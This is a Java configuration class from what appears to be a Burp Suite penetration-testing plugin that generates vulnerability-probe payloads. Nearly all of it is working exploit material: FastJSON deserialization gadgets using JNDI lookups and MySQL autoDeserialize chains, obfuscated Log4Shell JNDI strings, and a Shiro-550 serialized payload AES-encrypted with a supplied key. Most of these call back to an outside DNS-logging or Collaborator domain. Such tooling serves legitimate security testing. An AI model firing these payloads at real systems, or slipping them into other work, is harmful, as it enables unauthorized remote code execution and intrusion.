import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;
import java.util.HashMap;
import java.util.Random;

/*
 * JaySenScan - Burp Suite 加密环境渗透测试插件
 *
 * Copyright (C) 2025 JaySen (Jaysen13)
 *
 * 本软件采用 CC BY-NC-SA 4.0 许可证进行许可
 * 禁止用于商业售卖，允许非商业使用、修改和分享，衍生品需采用相同许可证
 *
 * 作者：JaySen
 * 邮箱：3147330392@qq.com
 * GitHub：https://github.com/Jaysen13/JaySenScan
 * 许可证详情：参见项目根目录 LICENSE 文件
 */
public class Config {
    String timestamp;
    String topDomain;
    String fastjsonPayload;
    String log4jPayload;
    String ceyeApiKey;       // 存储CEYE APIKey（从UI配置读取）
    String ceyeApiDomain;    // 存储CEYE域名（从UI配置读取）
    String collaboratorDomain; // 存储Collaborator域名
    public static enum DnslogType { CEYE, COLLABORATOR } // 规范枚举类命名（首字母大写）
    public DnslogType dnslogType; // 当前选中的DNSlog类型
    static String scanLogPath = System.getProperty("user.home") + "/.burp/jayesnScanLogs";;
    // 接收时间戳、顶级域名，以及从UI获取的配置
    public Config(String timestamp, String topDomain, String collaboratorDomain) {
        this.timestamp = timestamp;
        this.topDomain = topDomain;
        if (collaboratorDomain == null) {
           this.collaboratorDomain = DnslogConfig.getInstance().collaboratorDomain;
        } else {
            this.collaboratorDomain = collaboratorDomain; // 保存Collaborator生成的域名
        }
        DnslogType dnsType = DnslogConfig.getInstance().donlogType;
        // 根据选中的平台初始化配置
        if (dnsType == DnslogType.CEYE) {
            initCeyeConfig(); // 从UI配置读取CEYE参数
        } else {
            initCollaboratorConfig(); // 使用Collaborator域名
        }
    }

    // 初始化CEYE配置（从UI配置中读取APIKey和域名）
    private void initCeyeConfig() {
        // 从DnslogConfig单例中获取用户在UI输入的CEYE配置
        this.ceyeApiKey = DnslogConfig.getInstance().ceyeApiKey;
        this.ceyeApiDomain = DnslogConfig.getInstance().ceyeApiDomain;

        // 生成FastJSON和Log4j的Payload（使用用户配置的CEYE域名）
        generatePayloads(topDomain + "." + timestamp + "." +  this.ceyeApiDomain);
    }

    // 初始化Collaborator配置（使用Burp生成的域名）
    private void initCollaboratorConfig() {
        // 生成Payload时使用Collaborator域名
        generatePayloads(topDomain + "." + timestamp + "." +  this.collaboratorDomain);
    }

    // 统一生成Payload的方法（接收域名参数，适配CEYE和Collaborator）
    private void generatePayloads(String domain) {
        // FastJSON Payload（使用传入的domain替换所有占位符）
        this.fastjsonPayload = String.format(
                "[\n" +
                        "  {\n" +
                        "    \"3ny8v4\": {\n" +
                        "      \"\\u0040\\u0074\\u0079\\u0070\\x65\": \"com.alibaba.fastjson.JSONObject\",\n" +
                        "      \"98ko27\": {\n" +
                        "        \"\\u0040\\u0074\\u0079\\u0070\\x65\": \"java.lang.AutoCloseable\",\n" +
                        "        \"\\u0040\\u0074\\u0079\\u0070\\x65\": \"com.mysql.jdbc.JDBC4Connection\",\n" +
                        "        \"hostToConnectTo\": \"01%s\",\n" +
                        "        \"portToConnectTo\": 3306,\n" +
                        "        \"info\": {\n" +
                        "          \"user\": \"root\",\n" +
                        "          \"password\": \"123456\",\n" +
                        "          \"useSSL\": \"false\",\n" +
                        "          \"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\n" +
                        "          \"autoDeserialize\": \"true\",\n" +
                        "          \"NUM_HOSTS\": \"1\"\n" +
                        "        },\n" +
                        "        \"databaseToConnectTo\": \"mysql\",\n" +
                        "        \"url\": \"\"\n" +
                        "      }\n" +
                        "    }\n" +
                        "  },\n" +
                        "  {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://2%s/jndi\",\"autoCommit\":true},\n" +
                        "  {\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://3%s/Def\",\"autoCommit\":true}},\n" +
                        "  {\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"f\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://4%s/Asd\",\"autoCommit\":true}},\n" +
                        "  {\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://5%s/sq\",\"autoCommit\":true}},\n" +
                        "  {\n" +
                        "    \"hrg786\": {\n" +
                        "      \"@\\u0074\\x79\\x70e\": \"Lcom.s\\u0075n.\\u0072\\u006Fwse\\x74\\x2E\\u004A\\u0064\\u0062c\\u0052owS\\u0065t\\u0049mpl;\",\n" +
                        "      \"dataSourceName\": \"ldap://6%s/Sdf\",\n" +
                        "      \"autoCommit\": true\n" +
                        "    }\n" +
                        "  },\n" +
                        "  [\n" +
                        "    {\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"java.io.ByteArrayOutputStream\"},\n" +
                        "    {\"@type\":\"java.io.ByteArrayOutputStream\"},\n" +
                        "    {\n" +
                        "      \"@type\":\"java.net.InetSocketAddress\",\n" +
                        "      \"address\":null,\n" +
                        "      \"val\":\"7%s\"\n" +
                        "    }\n" +
                        "  ],\n" +
                        "  [\n" +
                        "    {\n" +
                        "      \"@type\":\"java.lang.Exception\",\n" +
                        "      \"@type\":\"com.alibaba.fastjson.JSONException\",\n" +
                        "      \"x\": {\n" +
                        "        \"@type\":\"java.net.InetSocketAddress\",\n" +
                        "        \"address\":null,\n" +
                        "        \"val\":\"8%s\"\n" +
                        "      }\n" +
                        "    },\n" +
                        "    {\n" +
                        "      \"@type\":\"java.lang.Exception\",\n" +
                        "      \"@type\":\"com.alibaba.fastjson.JSONException\",\n" +
                        "      \"message\": {\n" +
                        "        \"@type\":\"java.net.InetSocketAddress\",\n" +
                        "        \"address\":null,\n" +
                        "        \"val\":\"8%s\"\n" +
                        "      }\n" +
                        "    }\n" +
                        "  ],\n" +
                        "  {\"name\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\",\"proxy\":{\"connectionString\":{\"url\":\"jdbc:mysql://9%s/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&useSSL=false&user=yso_CommonsCollections5_calc\"}}}},\n" +
                        "  {\n" +
                        "    \"@type\":\"java.lang.AutoCloseable\",\n" +
                        "    \"@type\":\"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection\",\n" +
                        "    \"proxy\": {\n" +
                        "      \"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy\",\n" +
                        "      \"connectionUrl\": {\n" +
                        "        \"@type\":\"com.mysql.cj.conf.url.ReplicationConnectionUrl\",\n" +
                        "        \"masters\":[{\"host\":\"\"}],\n" +
                        "        \"slaves\":[],\n" +
                        "        \"properties\": {\n" +
                        "          \"host\":\"10%s\",\n" +
                        "          \"port\":\"3306\",\n" +
                        "          \"user\":\"yso_CommonsCollections4_calc\",\n" +
                        "          \"dbname\":\"dbname\",\n" +
                        "          \"password\":\"pass\",\n" +
                        "          \"queryInterceptors\":\"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\",\n" +
                        "          \"autoDeserialize\":\"true\"\n" +
                        "        }\n" +
                        "      }\n" +
                        "    }\n" +
                        "  },\n" +
                        "  {\"@type\":\"java.net.Inet4Address\",\"val\":\"11%s\"}\n" +
                        "]",
                domain, domain, domain, domain, domain, domain, domain, domain, domain, domain, domain, domain
        );

        // Log4j Payload（同样使用传入的domain）
        this.log4jPayload = String.format("[\n" +
                        "\"${jndi:rmi://1%s}\",\n" +
                        "\"${jndi:ldap://2%s}\",\n" +
                        "\"${${::-j}${::-n}${::-d}${::-i}:ldap://3%s}\",\n" +
                        "\"${jndi:ldap://${base64:dXNlcjE=}.4%s}\",\n" +
                        "\"${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://5%s}\",\n" +
                        "\"${${upper:j}${upper:n}${upper:d}${upper:i}:rmi://6%s}\",\n" +
                        "\"${jndi:jdbc:ldap://7%s}\",\n" +
                        "\"${jndi:ldap://8%s/a}${::-}\"\n" +
                        "]",
                domain, domain, domain, domain, domain, domain, domain, domain
        );
    }
    /***
     生成Shiro550 反序列化payload（URLDNS链）
     首先创建反序列化对象hashmap 再aes加密
     ***/
    public String generateShiro550Payload(String urlDns, String shiroKey) throws IOException, NoSuchFieldException, IllegalAccessException, NoSuchPaddingException, NoSuchAlgorithmException, IllegalBlockSizeException, BadPaddingException, InvalidAlgorithmParameterException, InvalidKeyException {
        // 实例化 URL 对象，此时 hashCode = -1
        URL url = new URL(urlDns);
        // 通过反射将 hashCode 设为非 -1，避免 put 时触发真正的 DNS 查询
        Field hashCodeField = URL.class.getDeclaredField("hashCode");
        hashCodeField.setAccessible(true);
        hashCodeField.set(url, 0); // 任意非 -1 值
        // 放入 HashMap
        HashMap<URL, String> map = new HashMap<>();
        map.put(url, "foo");
        // 恢复 hashCode 为 -1，保证反序列化后重新计算 hashCode 触发 DNS 查询
        hashCodeField.set(url, -1);
        // 序列化 HashMap
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(map);
        oos.close();

        // Aes加密
        byte[] key = Base64.getDecoder().decode(shiroKey);
        byte[] iv = new byte[16];
        new Random().nextBytes(iv);                     // 随机 IV
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
        IvParameterSpec ivSpec = new IvParameterSpec(iv);
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);
        byte[] encrypted = cipher.doFinal(baos.toByteArray());
        // 拼接 IV + 密文，再 Base64 编码
        byte[] combined = new byte[iv.length + encrypted.length];
        System.arraycopy(iv, 0, combined, 0, iv.length);
        System.arraycopy(encrypted, 0, combined, iv.length, encrypted.length);
        return Base64.getEncoder().encodeToString(combined);
    }

}




